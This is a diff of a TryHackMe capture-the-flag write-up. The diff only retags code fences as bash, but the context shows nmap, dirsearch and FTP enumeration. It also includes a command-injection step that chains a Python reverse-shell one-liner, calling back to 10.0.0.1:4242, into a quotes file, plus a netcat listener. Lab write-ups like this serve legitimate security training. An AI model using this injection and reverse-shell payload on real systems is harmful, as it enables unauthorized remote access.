@@ -4,7 +4,7 @@
 https://tryhackme.com/room/breakoutthecage1
 ## NMAP SCAN 
 ___
-```
+```bash
  starting Nmap 7.92 ( https://nmap.org ) at 2022-01-01 14:09 IST
  Nmap scan report for 10.10.24.112
  Host is up (0.17s latency).
@@ -62,7 +62,7 @@ we can clearly see that 3 ports are open
  
  
  ## dirserach Scan
- ```
+ ```bash
   _|. _ _  _  _  _ _|_    v0.4.1
  (_||| _) (/_(_|| (_| )
 
@@ -112,7 +112,7 @@ but i found something on /auditions page an audio , i will check it later
 
 
 ## FTP 
-```
+```bash
 $ftp 10.10.186.32
 Connected to 10.10.186.32.
 220 (vsFTPd 3.0.3)
@@ -136,7 +136,7 @@ local: dad_tasks remote: dad_tasks
 ftp> 
 ``` 
   so we got a file named dad_tasks
-  ```
+  ```bash
   # file dad_tasks 
     dad_tasks: ASCII text, with very long lines (396), with no line
 	terminators
@@ -189,16 +189,16 @@ lets see the spread_the_quotes.py
 the quotes file can be used to put reverse shell
 and we put in "hello" and && it bascily test line if hello print then it must be working 
 
-```
+```bash
 "hello" && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 now use netcat to listen to the port 
-```
+```bash
 nc -lvnp 4242
 ```
 and we got in 
 
-```
+```bash
  ┌──(kali㉿MSI)-[~]
 └─$ nc -lvnp 4444 
 Listening on 0.0.0.0 4444
@@ -217,7 +217,7 @@ cage@national-treasure:~$
 ```
 now you can look into the email files you will find again find a vigenere cipher just crack it and you will get the root access
 and you can find the root flag in /root/email_backup
-```
+```bash
 cat email_2
 From - master@ActorsGuild.com
 To - SeanArcher@BigManAgents.com
